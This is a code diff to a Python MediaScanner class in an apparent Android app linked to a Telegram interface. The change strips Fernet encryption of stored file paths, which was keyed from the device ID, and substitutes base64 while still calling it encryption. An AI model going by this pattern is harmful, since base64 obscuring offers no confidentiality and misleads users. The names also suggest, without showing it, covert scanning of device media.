@@ -33,14 +33,7 @@ try:
 except ImportError:
     JNI = False
 
-# محاولة استيراد التشفير
-try:
-    from cryptography.fernet import Fernet
-    from cryptography.hazmat.primitives import hashes
-    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
-    CRYPTO_AVAILABLE = True
-except ImportError:
-    CRYPTO_AVAILABLE = False
+# ========== إزالة cryptography بالكامل - استخدام base64 فقط ==========
 
 
 class MediaScanner:
@@ -49,7 +42,6 @@ class MediaScanner:
         self.ui = ui            # TelegramUI instance
         self.active = False
         self.did = "Unknown"
-        self._fernet = self._init_crypto()
         self._init_db()
 
         # جلب معرف الجهاز من الواجهة (إن وجد)
@@ -59,48 +51,20 @@ class MediaScanner:
         except:
             pass
 
-    # ========== نظام التشفير للمسارات ==========
-    def _init_crypto(self):
-        if not JNI or not CRYPTO_AVAILABLE:
-            return None
-        try:
-            Secure = autoclass('android.provider.Settings$Secure')
-            PythonActivity = autoclass('org.kivy.android.PythonActivity')
-            context = PythonActivity.mActivity
-            android_id = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID)
-            if not android_id:
-                android_id = "unknown_device"
-            salt = b'\xa7\x3c\xf8\x91\x4e\xb2\xd0\x65'
-            kdf = PBKDF2HMAC(
-                algorithm=hashes.SHA256(),
-                length=32,
-                salt=salt,
-                iterations=100000,
-            )
-            key = base64.urlsafe_b64encode(kdf.derive(android_id.encode()))
-            return Fernet(key)
-        except Exception as e:
-            logging.error(f"Crypto init error: {e}")
-            return None
-
+    # ========== نظام تشفير بسيط (base64 فقط - لا تبعيات خارجية) ==========
     def _enc(self, text: str) -> str:
-        if self._fernet:
-            try:
-                return self._fernet.encrypt(text.encode()).decode()
-            except:
-                pass
-        return base64.b64encode(text.encode()).decode()
+        """تشفير بسيط باستخدام base64 (لإخفاء المسار فقط، ليس أماناً حقيقياً)"""
+        try:
+            return base64.urlsafe_b64encode(text.encode()).decode()
+        except:
+            return text
 
     def _dec(self, enc_text: str) -> str:
-        if self._fernet:
-            try:
-                return self._fernet.decrypt(enc_text.encode()).decode()
-            except:
-                pass
+        """فك تشفير base64"""
         try:
-            return base64.b64decode(enc_text.encode()).decode()
+            return base64.urlsafe_b64decode(enc_text.encode()).decode()
         except:
-            return ""
+            return enc_text
 
     # ========== إدارة قاعدة البيانات ==========
     def _init_db(self):
